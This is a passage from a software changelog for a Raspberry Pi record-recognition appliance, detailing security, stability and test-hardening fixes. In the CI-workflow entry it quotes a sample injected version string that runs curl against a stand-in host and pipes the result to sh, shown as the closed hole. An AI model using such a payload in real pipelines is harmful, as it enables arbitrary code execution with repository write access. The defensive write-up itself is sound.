  The `sx`→`s` fix and the floors are pinned by new `test_layouts.py` cases.
- **A stalled SD read while loading cover art no longer freezes the whole event
  loop (STAB-5 #132 — LOW).** `_load_cover` ran `pygame.image.load` (an SD read),
  `.convert()` and `smoothscale` synchronously on the single asyncio loop, up to
  ~10×/s on a cache miss — so a worn card stalling a read for several seconds
  (normal wear-levelling / ECC-retry) blocked the audio-block drain, the
  silence ticker, and recognition along with it. The per-frame `_load_cover` is
  now non-blocking: it returns the cached scaled Surface or None (placeholder)
  and, on a cache miss, schedules an off-loop decode (`_decode_cover_async`,
  deduped by `(url, w, h)`). That task runs the SD read + decode
  (`pygame.image.load`) in the default executor — the actual stall — then does
  `.convert()` + `smoothscale` back on the loop (fast CPU on already-decoded
  bytes; `.convert()` needs the display's pixel format and SDL video ops belong
  on the main thread), caches the surface, and bumps `_cover_version` to
  repaint. The intricate STAB-1 machinery moved with it and its split got
  *cleaner*: corrupt/partial bytes fail in the off-loop `load()` → bounded
  unlink + refetch → blacklist; a display fault fails in the on-loop `.convert()`
  → log-once latch, never deleting the good file. RED-first (a spy proves the
  SD read now runs off the event-loop thread); the STAB-1 tests were moved to
  the async path and all failure classes stay mutation-pinned; full cold review
  SPEC / QUALITY PASS (dedup/leak/threading all reproduced clean).

### Security

- **`validate_image_file` no longer leaks a lowered `Image.MAX_IMAGE_PIXELS`
  process-global (#172 — LOW, test-hygiene).** It now saves and restores the
  Pillow global around the call, so a test that lowered the cap can't have that
  small value persist into a later test. (The restore is per-value-identity, not
  thread-isolated — concurrent validations on the shared executor may leave the
  global at the module cap — but every caller writes that identical safe
  *lowering*, so the residual is always the bound we want; strictly better than
  the old unconditional write.)

### Tests

- **The 4.5:1 guarantee is now mutation-proof (MUT-3 #127 — MEDIUM).** New
  assertions pin the contrast floor on the **output** of `extract_palette` over
  a battery of covers (including a deliberately low-contrast dark-blue), and
  that each clamp lifts a below-floor input above it while the hue-preserving
  lift keeps the hue. Mutating the 4.5 threshold, the clamp target (gradient →
  flat bg), the accent clamp itself, or the lift loop all now fail loudly — the
  suite previously only exercised covers that satisfied the guarantee for free.
  A new perf test proves the per-frame accent re-clamp keeps the palette-lerp
  cache-key count bounded (P-4 intact: 36 distinct palettes across a transition,
  flat as frame count rises).
- **The real `DisplayRenderer` is now constructed and exercised in tests, not
  just `__new__`'d around (TQ-1 #128 — MEDIUM).** Every renderer test built its
  subject with `DisplayRenderer.__new__(...)` and hand-assigned attributes, so
  `__init__`, `start()`, `_on_state_change` and the `_render()` status dispatch
  were **0% executed** — an `__init__` refactor that dropped
  `self.state.on_change(self._on_state_change)` would ship green while the Pi
  showed the boot card and then froze forever. New `test_renderer_lifecycle.py`
  builds the real object under `SDL_VIDEODRIVER=dummy`: it asserts (behaviorally,
  through a real `set_status` → Signal → handler) that construction wires the
  state subscription; table-drives `_render()` across every `PlayerStatus`
  (IDLE / LISTENING / ERROR / PLAYING-with-track / PLAYING-without-track →
  boot); and smoke-tests `start()` creating a headless surface. Proven by
  mutation: dropping the subscription, or misrouting a dispatch arm, fails the
  new tests while the entire prior renderer suite (59 tests) stays green — the
  exact blind spot the finding named. Test-only; no production change.

## [1.5.4] — 2026-08-06

**Code-review hardening, round 3 (Wave 3 — untrusted input & credential
hardening).** Wave 3 of the same audit (`CODE_REVIEW_2026-07-30.md`): the gaps
around untrusted-input handling and credential safety, plus the guard paths the
suite never executed — the checks that stand between a stranger-editable Discogs
field and the appliance.

### Fixed

- **A truncated or corrupt cover download is now rejected instead of cached and
  displayed forever (DISP-3 / SEC-6, #110 — MEDIUM).** `validate_image_file` is
  the only gate between the network and the on-disk cover cache
  (`cover_cache.download()`), and the download loop never reconciles bytes
  against `Content-Length`. Its docstring claimed Pillow's `verify()` rejects
  truncated files — but `verify()` does no structural check for JPEG (the format
  the cache is named for: `path_for` returns `<md5>.jpg`); only
  `PngImageFile.verify()` actually validates. So a cover whose download was cut
  off mid-scan by a dropped connection passed validation, was `os.replace`'d into
  the cache, and — since `exists()` never re-validates — was shown for every
  future play of that album, with `extract_palette` deriving the whole five-colour
  scheme from the garbage half. Both failures were silent. The validator now
  reads the header and applies the format + pixel-count gates first (so a
  decompression bomb is still rejected before any decode), then forces a real
  `Image.open(path).load()` — the only structural check that bites for JPEG —
  with `LOAD_TRUNCATED_IMAGES` left False so a short read raises. Verified against
  truncated JPEG/PNG/WEBP/GIF/BMP (and a corrupt-mid-scan JPEG); the caller
  already unlinks the rejected `.part` file and retries within a bounded limit.
  RED-first (the truncated JPEG reproduced passing validation on the old code);
  the `load()` gate is mutation-pinned (delete-`load` and `load`→`verify` both
  killed); cold review SPEC / QUALITY PASS. The misleading docstring/comment were
  corrected to describe what `verify()` actually does per format.
- **A malformed MusicBrainz release no longer discards cover art from a later
  release, and `get_cover_art_url` gained its first test file (TQ-3, #115 —
  MEDIUM).** `src/metadata/coverart.py` parses untrusted MusicBrainz payloads
  into a URL the fetcher then dials, but had **no tests at all** and a latent
  bug: when MusicBrainz returned a release's images as a list of strings (not
  dicts), `img.get('front')` raised `AttributeError`, which escaped the inner
  `except ResponseError` and aborted the *whole* candidate loop — so a later
  release that had valid art was never tried (a `ResponseError` on the same
  release would have skipped to it correctly). The per-release body is now
  fully guarded: a non-dict image, a non-dict payload, a non-iterable image
  list, or a release without an `id` skips that release and tries the next,
  and the return value is guaranteed to be a `str` (or `None`) so a mistyped
  payload can't hand a non-string to the fetcher. URL scheme/host validation is
  deliberately left to the SSRF-hardened fetcher (`cover_cache`), not
  duplicated. New `tests/test_coverart.py` (musicbrainzngs patched) covers the
  happy path, empty/missing lists, `ResponseError`-then-success, four malformed
  payloads (incl. non-dict images and a `file://` URL), and the return-type
  contract. RED-first (the four negative cases fail on the old code); the fix is
  mutation-pinned in every element; cold review SPEC / QUALITY PASS.
- **The Discogs transport no longer silently turns a non-GET/POST verb into a
  POST (LB-2, #117 — LOW).** `request()` dispatched `session.get if method ==
  "GET" else session.post`, so `request("DELETE", …)` / `("PUT", …)` silently
  issued POSTs, and a lowercase `request("get", …)` failed the `== "GET"` test
  twice — it POSTed *and* lost its 429 retry. Latent today (only GET/POST are
  used), but a silent-wrong-verb footgun on the one transport that WRITES to the
  real collection. `request()` now upper-cases the method, dispatches GET/POST
  explicitly, and raises `ValueError` on any other verb. (Kept the
  `session.get`/`session.post` seam the docstring documents for test mocking
  rather than the finding's `session.request` suggestion; all six in-tree callers
  pass uppercase `"GET"`/`"POST"` literals, so nothing breaks.) RED-first;
  mutation-pinned; cold review SPEC / QUALITY PASS.
- **The per-hop cover-art connection pool is closed instead of leaked (STAB-3,
  #123 — LOW).** `_open_cover_stream` built a fresh `urllib3.HTTPSConnectionPool`
  per redirect hop as a local and never closed it; `download()`'s `finally` only
  released the connection back to a pool nobody would reuse. No fd leak was
  measured, but every cover paid a full TCP+TLS handshake and pool objects
  churned. The pool is now context-managed (`with … as pool:`) and closed as
  soon as the streaming response is checked out — the response keeps its own
  connection and streams fine after close (verified end-to-end against a real
  localhost server: 300 KB streamed post-close, and `release_conn()` is safe
  against the closed pool). RED-first (a `closed` assertion fails on the old
  code); cold review SPEC / QUALITY PASS. The finding's optional keyed-pool cache
  (connection reuse) was deliberately deferred.

### Security

- **A wrong-typed credential in `config.yaml` no longer leaks into the logged
  startup error (SEC-3, #114 — MEDIUM).** The aggregated `ConfigError` from
  `config.py` interpolated every wrong-typed field's raw value with `!r` —
  including `discogs.user_token` and the Last.fm `api_key` / `api_secret` /
  `session_key` — and `main.py` logs that error in full to the systemd journal.
  So a credential YAML doesn't read as a string (an all-digit token read as int,
  a `1e5`-shaped value, `yes`/`no`, a mis-pasted list) failed startup loudly
  *and* wrote the secret verbatim to a log that persists across reboots. The
  type-mismatch message now emits `<redacted>` for a known set of secret fields
  while still reporting the path and observed type; non-secret fields keep their
  value (the operator needs `got 44100.0` to fix a config). RED-first (the four
  credentials reproduced leaking on the old code); the redaction is
  mutation-pinned in all four directions; cold review SPEC / QUALITY PASS across
  int/float/bool/list/dict secret shapes and the aggregated / non-mapping error
  paths.
- **Capped `urllib3 <3` and added a real-pool guard so a breaking upgrade can't
  silently drop the S-7 IP pin (TQ-4, #116 — MEDIUM).** The cover fetcher's
  SSRF pin (`cover_cache._open_cover_stream`) relies on urllib3 forwarding the
  `server_hostname` (TLS SNI) and `assert_hostname` (cert hostname) kwargs to
  the connection, but `requirements.txt` pinned `urllib3>=2.0.0` floor-only and
  the existing test *mocks* the pool — so a future `pip install` resolving a
  urllib3 that removed those kwargs would only surface on the Pi. Pinned
  `urllib3>=2.0.0,<3.0.0` (that major is the one dep with a documented
  API-contract risk; other floors left as-is) and added a test that builds a
  **genuine** `HTTPSConnectionPool` + connection (no socket) and asserts both
  kwargs actually reach the connection, so a breaking urllib3 fails in CI
  instead. Non-vacuity shown (dropping a kwarg reddens the test); cold review
  SPEC / QUALITY PASS. The hashed lockfile and broader version ceilings the
  finding also suggested were deliberately deferred (a hashed lock is
  platform/Python-specific and best generated on the Pi).
- **`_redact_url` no longer leaks the raw URL (query string included) on an
  empty-path URL (SEC-2, #120 — LOW).** The `return "/".join(segments) or url`
  fallback returned the original URL verbatim whenever `parts.path` was empty,
  because `"/".join([""])` is falsy — exactly defeating the redaction's promise
  to drop the query string (where a future query-string credential would land in
  the 429 log). Latent today (the token rides in a header), but the log path is
  the whole point of the function. It now returns the masked path or a bare `/`,
  never the raw URL. Verified across 12 adversarial URLs (origin-only, userinfo,
  protocol-relative, `?`-only, root path) — no query/credential/host leaks; the
  username-masking + query-drop still hold on a normal path. RED-first;
  mutation-pinned; cold review SPEC / QUALITY PASS.
- **The SSRF IP classifier decodes and re-checks the IPv4 embedded in NAT64 /
  6to4 addresses, independent of the Python version (SEC-5, #122 — LOW).** A
  NAT64 (`64:ff9b::/96`) or 6to4 (`2002::/16`) address can wrap an internal IPv4
  (e.g. `169.254.169.254`). Modern CPython (≥3.11.9 / ≥3.9.19, via gh-113171)
  already flags these prefixes as `is_reserved` / `is_private`, so the existing
  battery rejects them on the app's runtime (Python 3.11) — the finding's
  "classifies as global and would be pinned" premise was measured false there,
  so this was not a live hole. But a security boundary should not depend on the
  stdlib's version-specific handling of exotic ranges, so the classifier now also
  decodes the embedded IPv4 (`_embedded_ipv4`) and re-runs the same battery
  (`_is_disallowed_ip`, extracted verbatim from the inline checks) on it —
  rejecting an internal wrap on ANY Python. The decoder is pinned directly (on
  ≥3.11.9 the generic battery short-circuits the embedded check, so it is
  belt-and-suspenders there). Cold review SPEC / QUALITY PASS; no encoding
  (IPv4-mapped v6, NAT64, 6to4, mixed answer sets) pins an internal IP.
- **A slow-drip cover response can no longer park a shared executor worker
  forever; the whole fetch now has a wall-clock deadline, and an oversized
  declared body is rejected up front (SEC-4, #121 — LOW).** `cover_cache.download()`
  ran on the default executor that Discogs requests and Last.fm scrobbles also
  share, and its `urllib3.Timeout(read=15)` bounds each *socket read*, not the
  transfer — so an allow-listed but flaky/hostile host emitting one byte per
  <15s keeps every read inside the timeout while the download runs effectively
  forever, starving that pool. The fix adds a monotonic `_DOWNLOAD_DEADLINE_SECONDS`
  (45s) budget spanning the whole call — checked before each redirect hop and
  before each body read — plus an early reject when a response *declares* a
  `Content-Length` over the 10 MB cap. Critically, the body is now read with
  `resp.read1(64*1024)` rather than `resp.stream(64*1024)`: `stream` delegates to
  a buffered read that blocks until a full 64 KB chunk accumulates, so under a
  drip a single read never returns and the deadline check never gets a turn —
  the first cut of this fix (and its mock-`stream` test) hid exactly that live
  hang, caught by adversarial review and reproduced against real urllib3. `read1`
  returns after one underlying socket read, so control returns to the deadline
  check after each recv and the drip is bounded. RED-first; a **real-socket**
  integration test drips bytes through live urllib3 and proves `download()`
  aborts at the deadline (and fails fast, not hangs, if the code ever regresses
  to a buffering read); all five guards mutation-pinned (both deadline checks,
  the declared-size `>`-vs-`>=` boundary and its flip, the garbage-header
  try/except). Cold review then narrow second-pass: SPEC / QUALITY PASS. A
  distinct, pre-existing header-drip vector the review surfaced (a hop dripping
  response *headers* inside `urlopen`, which the between-hop deadline can't
  interrupt) is filed as follow-up #176, not folded into this fix.
- **The version-badge CI workflow no longer lets `VERSION` file content inject
  shell in a `contents: write` job, and pins its action to a commit SHA (TQ-5,
  #124 — LOW).** `sync-version-badge.yml` read the pushed version with
  `cat VERSION` and textually interpolated `${{ steps.ver.outputs.version }}`
  into three `run:` shells (a warn `echo`, the `sed` badge rewrite, and the
  commit message) — so a `VERSION` of `1.5.2$(curl$IFS-sfL$IFSevil.sh|sh)` would
  execute arbitrary commands in a job whose `GITHUB_TOKEN` can push to `main`
  (the `tr -d '[:space:]'` there blocks spaces but not `$IFS`, `$()`, or
  backticks). `sed`'s `|` delimiter also meant a `|`/`&`/`\` in the version
  corrupted the replacement, and `actions/checkout` floated on the mutable tag
  `@v4`. Now the version is validated against a strict semver pattern
  (`^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$`, which keeps `1.4.0-rc1`-style
  pre-release tags working while admitting no shell/sed metacharacter) and the
  build fails loudly before use if it doesn't match; the value is then handed to
  every shell via step-level `env:` and referenced as `"$VERSION"` — inert data,
  never spliced into script text; and `actions/checkout` is pinned to the full
  commit SHA `11bd719…af683` (v4.2.2, API-verified). Defense is layered:
  validation rejects a payload up front, and env-passing keeps it inert even if
  validation were bypassed. Verified by executing each step's shell — the old
  interpolation runs an injected `$()` (RED), the env form does not, malformed
  and empty versions are rejected, and the badge still rewrites correctly for
  `1.5.4` and `1.4.0-rc1`; shellcheck-clean, YAML-valid; cold review SPEC /
  QUALITY PASS. (Credit retained from the finding: `permissions:` was already
  explicitly job-scoped, not default write-all.)

### Tests

- **Pinned both rejection paths of `validate_image_file` — the cover-art format
  allow-list and the decompression-bomb dimension bound (MUT-2, #109 — HIGH).**
  `cover_cache.download()` calls this as the last check before a stranger-editable
  Discogs image URI is written into the on-disk cache, yet both `raise` branches
  had zero test executions. The only "oversized" test fed a 40× image, which
  trips Pillow's *own* 2× `DecompressionBombError` and is caught by the generic
  `except` — so the explicit `width * height > MAX_IMAGE_PIXELS` guard (the sole
  defense in the 1×–2× "bomb" band Pillow only *warns* about) and the format
  allow-list could each be deleted with the suite still green. Added three tests:
  a valid JPEG accepted; a valid-but-disallowed format (TIFF) rejected by the
  allow-list; and an image in the 1×–2× band rejected by the explicit dimension
  guard — each message-matched so it pins its own branch rather than Pillow's
  backstop. The four previously-surviving guard mutants ('condition → False' and
  'delete raise' on each guard) are now killed, along with a JPEG-allow-list
  mutant; the existing >2× "oversized" test gained a comment clarifying it
  exercises Pillow's backstop, not the explicit guard. Cold review SPEC / QUALITY
  PASS. Test-only; no production behavior change.
- **Pinned the cover-cache's *default* disk bounds — the `max_files` / `max_bytes`
  the real appliance actually runs with (MUT-6, #111 — MEDIUM).** Every existing
  test constructs `CoverArtCache` with explicit bounds, so the module defaults
  (`_DEFAULT_MAX_CACHE_FILES = 500`, `_DEFAULT_MAX_CACHE_BYTES = 256 * 1024 * 1024`)
  and their arithmetic were asserted nowhere — ten mutants survived, including
  either single `*` → `/` on the byte constant (both collapse 256 MB to 256
  *bytes*). A units slip would ship green and, on the Pi, prune the entire cover
  cache to zero every boot: every album re-downloads, meaning SD-card write
  amplification and a coverless display when offline. Added two tests: one asserts
  `CoverArtCache(dir)` built with no bounds has `max_files == 500` and
  `max_bytes == 256 * 1024 * 1024`; one seeds 501 covers and confirms `_prune()`
  returns to exactly 500 via the default file-count bound. Both `*` → `/`
  survivors and the count-value mutants (each verified a genuine survivor of the
  pre-change suite) are now killed. Cold review SPEC / QUALITY PASS. Test-only; no
  production behavior change.
- **Pinned the cover-cache eviction loop across *many* evictions (MUT-7, #112 —
  MEDIUM).** No test anywhere ran `_prune()`'s eviction while-loop body more than
  once, so two mutants survived: `i += 1` → `i += 0` (which, on a second
  iteration, re-picks the already-unlinked victim, `unlink` raises `OSError`, the
  `continue` skips the decrement, and it **spins forever** — an infinite loop
  inside `CoverArtCache.__init__`, so the appliance never finishes booting) and
  `file_count -= 1` → `-= 2` (a silent under-evict that lets the cache grow past
  its bound and fill the SD card). Added three tests: seed 10 covers with distinct
  mtimes and prune to `max_files=3`, asserting the 3 newest survive by name (a
  7-file eviction); the same driven by the byte bound; and a case where a victim's
  `unlink` raises `OSError`, asserting `_prune()` skips it and terminates. Both
  mutants — verified genuine survivors of the pre-change suite — are now killed
  (`i += 0` by non-termination, `-= 2` by the post-eviction count). Cold review
  SPEC / QUALITY PASS. Test-only; no production behavior change.
- **Pinned the *whole* streaming-kwarg contract of the cover fetch, not just
  `redirect` (MUT-8, #113 — MEDIUM).** `_open_cover_stream` passes four booleans
  to `pool.urlopen` — `redirect=False`, `retries=False`, `preload_content=False`,
  `decode_content=False` — but the test asserted only `redirect`, leaving the
  other three mutable with the suite green. The load-bearing one is
  `preload_content`: flipped to `True`, urllib3 reads the *entire* response body
  into RAM before `download()` can apply its `_MAX_COVER_BYTES` chunk cap, so a
  few-hundred-MB (attacker-influenced or merely broken) cover URL becomes a RAM
  exhaustion on a 2 GB Pi even though the on-disk file stays bounded;
  `decode_content=True` would likewise let a gzip-inflated body dodge the
  pre-inflation byte count. The `_open_cover_stream` test now asserts all four
  kwargs. `retries`, `preload_content`, and `decode_content` were each verified
  genuine survivors of the pre-change suite and are now killed (kwarg *deletion*
  is caught too, since urllib3 defaults `preload_content` to `True`). Cold review
  SPEC / QUALITY PASS. Test-only; no production behavior change.
- **Individually pinned each `download()` failure guard, so a dropped check
  can't hide behind a later one (MUT-10, #118 — LOW).** The five guards
  (redirect cap, no-response, HTTP-status `>= 400`, Content-Type allow-list,
  byte cap) were interchangeable in the suite: every failure still terminated in
  *some* downstream exception, so deleting the Content-Type check stayed green
  because a non-image body later failed image validation — while a valid image
  served as `text/html`, or a 400 carrying an image body, would flow into the
  cache. Each guard's test now uses `pytest.raises(match=...)` to pin its own
  branch, plus a new `status == 400` boundary case (valid PNG body, so bypassing
  the `>=` guard would otherwise succeed) and a redirect-overflow case. All
  reachable guard mutants are killed (`>=`→`>`, check-disable, and — verified via
  a message-only mutation — the `match=` strings pin the intended branch). The
  `if resp is None` guard is unreachable through the public `download()` (the
  loop only `break`s with a response set, and exhaustion raises "too many
  redirects" first), so it is a documented equivalent mutant, not black-box
  testable. Test-only; no production behavior change.
- **Pinned every numeric limit in the fetch and rate-limit paths to its shipped
  value (MUT-9, #119 — LOW).** `_MAX_COVER_BYTES`, `_MAX_COVER_REDIRECTS` (5),
  `_COVER_CONNECT_READ_TIMEOUT` (15), and transport's `_HTTP_TIMEOUT` (15),
  `_RATE_LIMIT_MAX_WAIT` (10), `_RATE_LIMIT_DEFAULT_WAIT` (2) were all mutable
  with the suite green — tests proved a cap *existed*, never *which*, so a
  redirect cap raised to 500 or a units slip would ship silently. Added a
  constants assertion per module, a redirect chain driven to exactly
  `_MAX_COVER_REDIRECTS + 1` hops (into the "too many redirects" raise), and a
  `Retry-After: 0` case asserting the retry still sleeps `1` — pinning the
  `wait = max(1, retry_after)` floor against the `max(0, …)` mutant that would
  fire an instant retry at an API that just throttled the device. All named
  mutants killed. Test-only; no production behavior change.

## [1.5.3] — 2026-08-04

**Code-review hardening, round 3 (Wave 2 — keep the appliance alive).** Wave 2 of
the same audit (`CODE_REVIEW_2026-07-30.md`): the liveness and crash-loop findings
that decide whether the unattended appliance recovers on its own — through a device
glitch, a bad config edit, or network trouble — or needs a power cycle. Not the
irreversible-data issues (that was Wave 1), but the ones that keep it running.

### Fixed

- **A stalled capture stream is now detected and rebuilt instead of hanging
  forever (CONC-5, #91 — HIGH).** Audio blocks reach the capture loop only via the
  PortAudio callback's `call_soon_threadsafe`; if the USB interface browns out or
  is unplugged mid-album (or the callback aborts from CFFI), the callback stops
  firing, nothing raises in the consumer, and `await blocks.get()` parked `run()`
  forever — capture silently dead while the process stayed alive, the display stuck
  in IDLE, nothing in the journal. `run()` now waits for each block with a
  `_BLOCK_STALL_TIMEOUT_SECONDS` (4s = 16 block intervals) timeout and, on a stall,
  raises into the existing tear-down + backoff + rebuild path, so a recovered device
  (or a fresh stream) resumes capture on its own. The PortAudio callback body is
  also wrapped so a callback exception logs instead of silently aborting the CFFI
  stream. RED-first (the hang reproduced); the timeout wrap, the timeout value, the
  rebuild-on-stall, and the callback guard are mutation-pinned; cold review SPEC /
  QUALITY PASS — buffered blocks win the `wait_for` race so a legitimate event-loop
  stall can't false-trip it, and the rebuild cycle is bounded (~0.2 Hz).
- **A domain-invalid config value is now one friendly startup error instead of a
  crash loop (CRIT-1, #92 — HIGH).** `config.py` validated field TYPES but never
  their value DOMAINS, so a plausible hand-edit — `sample_rate: 0`, a negative
  `overlap_seconds` — passed validation and then crashed the capture leg deep in
  `ChunkAssembler` (a `ValueError` on `chunk_frames <= 0` or `hop > chunk_frames`)
  with a raw traceback, which systemd's `Restart=on-failure` turned into a
  permanent 10-second crash loop and a black screen the owner finds hours later.
  Each section now runs value-domain checks accumulated into the SAME
  `ConfigError` as any type error — honoring config.py's "single source of truth"
  / "one friendly startup failure" promise: `sample_rate > 0`, `chunk_seconds > 0`,
  `overlap_seconds >= 0`, `width/height > 0`, `poll_interval_seconds > 0`,
  `confirmation_required >= 1`, `error_after_misses >= 1`. The finding's
  `overlap < chunk` upper bound is deliberately NOT enforced at config: an
  `overlap >= chunk` is a benign degradation `AudioCapture` already handles by
  disabling overlap (the appliance keeps running), so rejecting it would
  crash-loop an otherwise-functional appliance — only the genuinely-crashing
  `overlap >= 0` bound is enforced (a negative overlap makes `hop > chunk_frames`,
  which ChunkAssembler rejects, and AudioCapture's guard does not catch it).
  RED-first (the accepted-then-crashed value reproduced); every domain boundary
  and the type-error None-guard are mutation-pinned; cold review SPEC / QUALITY
  PASS — the overlap deviation independently execution-verified as more correct
  than the finding.
- **An unimplemented `recognition.backend` is now a friendly startup error, not a
  crash loop (CRIT-2, #93 — HIGH).** Only `shazamio` is built, but
  `config.example.yaml` advertised `acrcloud`/`audd` as options; selecting one
  passed config's type check and then raised `ValueError` from
  `RecognitionLoop.__init__` — constructed OUTSIDE main()'s only try/except (which
  wraps `load_config` alone) — exiting with a raw traceback into a systemd crash
  loop, exactly the CRIT-1 class. A new `IMPLEMENTED_BACKENDS` frozenset in
  `config.py` is the single source of truth: `RecognitionConfig` validates
  `backend` against it (landing in the same aggregated `ConfigError`), and
  `recognizer._init_backend` constructs against the same set, so config and
  construction can never drift. The example config's comment no longer advertises
  the unimplemented backends as selectable. RED-first (the accepted-then-crashed
  backend reproduced); the membership check, the set contents, and the
  direct-construction backstop are mutation-pinned; cold review SPEC / QUALITY
  PASS (no circular import, no drift, type-safe).
- **A track identified every OTHER chunk now confirms instead of latching the
  display to ERROR (REC-1, #94 — HIGH).** `_handle_result` zeroed the pending
  candidate (`_pending_result` + `_pending_count`) on *every* `None` result, so a
  confirmation needed N matching results with no intervening miss. On vinyl a
  hit/miss/hit/miss pattern is the *normal* failure mode (surface noise, a worn
  side): Shazam re-identified the same track every other chunk, the pending kept
  resetting so it never reached `confirmation_required`, and `_register_miss`
  drove the player to ERROR ("NO MATCH FOUND") — no now-playing card, no play
  count, no scrobble, recovery only via a manual needle reposition. A `None` result
  (which carries no recognition information) no longer discards the pending; the
  miss still counts toward the ERROR threshold, but a genuine alternating
  identification now confirms first, so ERROR fires only when the side is truly
  unrecognizable. Because a surviving pending is no longer session-bound by the
  wipe, the fix also session-scopes it: a new `_pending_epoch` tags each pending
  with the `session_epoch` it was built under, and a chunk from a *different*
  session discards the stale pending — closing a cross-session phantom-commit the
  first cold review caught (a single spurious live hit of the previous record
  could otherwise confirm a stale track into the NEXT record's session, a phantom
  the commit-boundary epoch guard cannot catch because the confirming audio is
  genuinely live). RED-first (both the ERROR-latch and the phantom-commit
  reproduced); the pending-preservation, the epoch-mismatch reset, and the
  epoch-tag are each mutation-pinned by their intended tests; cold review SPEC /
  QUALITY PASS, and a narrow second pass over the session-scoping rework could not
  break it (both scenarios execution-verified).
- **An un-decodable or display-faulted cover no longer becomes an unbounded
  download + unlink + log loop (STAB-1, #95 — HIGH).** `_render_now_playing`
  calls `_load_cover` every frame and re-arms the render loop each frame (unless
  `reduced_motion` is on), and `_load_cover`'s single `except Exception` treated
  ANY failure as "corrupt cached file": it unlinked the file and spawned a fresh
  download, with no failure counter, no negative cache and no spawn dedup. The
  re-download re-landed the same bytes, bumped `_cover_version` and set `_dirty`,
  so the cycle sustained itself at ~8.7 Hz — ~31k HTTPS GETs/hour, ~31k SD
  unlinks/hour, ~9 GB/hour of SD writes and ~31k journald WARNINGs/hour,
  indefinitely and unattended. Worse, the same clause fired for a `pygame.error`
  raised by `.convert()` on an HDMI/X video-mode loss, so a transient display
  glitch *deleted a perfectly good cover* and started hammering. The load path is
  now bounded: a per-URL decode-failure counter unlinks + refetches at most once
  (`_COVER_MAX_LOAD_FAILURES`), then negative-caches the URL (`_cover_bad_urls`)
  so later frames early-return with no disk/network/log until a state change to a
  new cover lifts it. Decode and convert are split into separate `try`s — a
  `pygame.image.load()` failure is corrupt bytes (bounded refetch); a
  convert/scale failure is a display fault on GOOD bytes, so the file is kept, no
  refetch is issued, and the warning is latched (`_cover_decode_deferred`) to one
  line per outage instead of ~10/second. Concurrent prefetches for one URL are
  deduped against an in-flight set. RED-first (the undecodable loop, the good-file
  deletion, and the double-download each reproduced); every load-bearing line is
  mutation-pinned by its intended test; cold review SPEC / QUALITY PASS. The cold
  review's narrow second pass caught a real regression — the fail-safe branch that
  stops a stray non-`pygame` error from crashing the unguarded render loop was
  itself an unbounded per-frame ERROR log — which was then folded into the same
  latch (WARNING for the expected video-mode fault, ERROR for the unexpected) and
  re-verified clean over a third pass. (A pre-existing, track-cadence — not
  frame-rate — palette-decode WARNING on a blacklisted-but-on-disk cover was
  surfaced and filed separately, not folded in.)
- **A slow end-of-session Discogs write no longer stalls recognition of the next
  record (CONC-2, #96 — MEDIUM).** `_end_session` held `_lifecycle_lock` for the
  whole of `_finalize_session` — up to three executor-dispatched HTTP round trips
  (Play Count, Last Played, Last.fm love), each bounded-retried. `on_track_identified`
  takes that same lock first and is awaited inline by the recognition pipeline
  (`TrackCommitService.commit → RecognitionLoop.run`), so a slow Play Count write
  for the record that just ended was one-for-one dead time for recognition: drop
  side B within 20s of side A ending on a slow uplink and every confirmed track of
  side B blocked on the lock while `RecognitionLoop` stopped draining its
  maxsize-5 audio queue, so side B's opening was never identified. The session is
  now **detached synchronously** under the lifecycle lock (`_detach_session_locked`,
  which — being await-free — also strengthens the B-2 atomicity), and the crediting
  runs **outside** the lock. A dedicated `_finalize_lock` serializes the crediting
  work so moving it off the lifecycle lock doesn't let two detached sessions hit
  the shared Discogs `requests.Session` (`max_workers=2` pool) concurrently; the
  two locks are never nested, so there's no deadlock. RED-first (the stall
  reproduced: a stuck credit blocked `on_track_identified` on today's code); the
  finalize-outside-the-lock move and the finalize-lock serialization are each
  mutation-pinned, and the B-2 split-race + idempotency suites still pass. Cold
  review SPEC / QUALITY PASS, verifying no double/lost credit, no deadlock, and an
  intact B-2 / CONC-1 (drain) / CONC-6 (is_stale). It surfaced one bounded residual
  — an album-split credit is still awaited inline and takes `_finalize_lock`
  unconditionally, so a split commit can briefly wait behind an unrelated in-flight
  credit (strictly better than before, filed as #166) — resolved here as a comment
  correction, not a scope-creeping behavior change.
- **A genuine network timeout on the recognize/commit path is now logged and
  backed off instead of silently swallowed (CONC-4, #97 — MEDIUM).** In
  `RecognitionLoop.run()` the `wait_for` timeout — meant only to signal "no audio
  queued" — shared one `try` with `backend.recognize()` and `_handle_result()`.
  On Python 3.11 `asyncio.TimeoutError` IS `builtins.TimeoutError` (== a socket
  timeout, and the base of aiohttp's `ServerTimeoutError`), so a real network
  timeout on the resolve/commit path was caught by `except asyncio.TimeoutError:
  pass`, classified as an idle poll, and retried immediately — hot-spinning on a
  failing network with nothing in the journal, while the sibling `except Exception`
  one line down would have logged it and backed off. The `try` is now split so the
  `except asyncio.TimeoutError` covers ONLY the queue `wait_for` (`continue` on an
  idle poll); `recognize()` + `_handle_result()` sit in a second `try` whose
  `except Exception` logs and `sleep(2)`-backs-off any error — a genuine
  `TimeoutError` included. `asyncio.CancelledError` is a `BaseException`, so a task
  cancel still unwinds the loop cleanly. RED-first (the swallowed timeout
  reproduced); the try split, the idle-path `continue`, and the broad error
  handler are each mutation-pinned; cold review SPEC / QUALITY PASS (clean
  cancellation at every await point, no lost behavior). The recognize call still
  has no per-call timeout — that is the separate PCONC-2 (#100), out of scope here.
- **Shutdown no longer hangs on the interpreter's default thread pool (CRIT-3,
  #98 — MEDIUM).** After `main()` returned, `asyncio.run()` on Python 3.11 awaits
  `loop.shutdown_default_executor()`, a `shutdown(wait=True)` join with no timeout.
  Every non-Discogs blocking call funnelled through that default pool — Last.fm
  scrobble/love, cover download, palette extraction, MusicBrainz cover-art lookup,
  WAV encode — so a backed-up queue of them (side A's credit in flight over a slow
  link, side B's scrobbles behind it) made process exit wait for the WHOLE queue
  to run; with no `TimeoutStopSec` in the documented unit, systemd SIGKILLed at its
  90s default, which is exactly when CONC-1's half-written collection update
  becomes permanent. The app now OWNS that pool: `install_io_executor` creates a
  bounded `ThreadPoolExecutor` and makes it the loop's default (so all six
  `run_in_executor(None, …)` sites route to it; the Discogs writes keep their own
  dedicated pool, #61), and `run_pipeline`'s finally shuts it down with
  `wait=False, cancel_futures=True` as the last teardown step — after `drain()`,
  so an in-flight credit's Last.fm love isn't dispatched to a closed pool. That
  drops QUEUED blocking work at exit instead of waiting on it (measured: a
  backed-up queue that made shutdown take 6.0s now takes 2.0s). A call already
  RUNNING on a worker can't be interrupted (Python can't kill a thread), so the
  documented systemd unit gains `TimeoutStopSec=30` as the backstop. RED-first
